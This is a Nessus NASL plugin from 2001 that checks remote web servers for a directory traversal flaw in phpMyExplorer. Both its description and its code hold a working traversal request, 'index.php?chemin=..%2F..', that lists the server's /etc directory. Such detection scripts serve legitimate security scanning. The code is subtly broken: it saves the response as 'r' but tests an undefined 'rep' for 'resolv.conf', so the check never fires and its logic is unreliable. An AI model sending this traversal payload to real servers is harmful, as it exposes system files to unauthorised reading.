#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10750);
 script_version ("$Revision$");
 script_cve_id("CAN-2001-1168");
 script_bugtraq_id(3266);
 
 name["english"] = "phpMyExplorer dir traversal";
 script_name(english:name["english"]);
 
 desc["english"] = "phpMyExplorer is vulnerable to a 
directory traversal attack which allows anyone to
make the remote web server read and display arbitrary
directories.

Example:
    GET /index.php?chemin=..%2F..%2F..%2F..%2F%2Fetc

will return the content of the remote /etc directory

Solution: Contact your vendor for the latest software release.
Risk factor : Serious";

 script_description(english:desc["english"]);
 
 summary["english"] = "phpMyExplorer dir traversal";
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_kb_item("Services/www");
if(!port)port = 80;
if(!get_port_state(port))exit(0);


foreach dir (cgi_dirs())
{
  buf = string(dir, "/index.php?chemin=..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fetc");
  buf = http_get(item:buf, port:port);
  r = http_keepalive_send_recv(port:port, data:buf);
  if( r == NULL ) exit(0);
  if("resolv.conf" >< rep)security_hole(port);
}
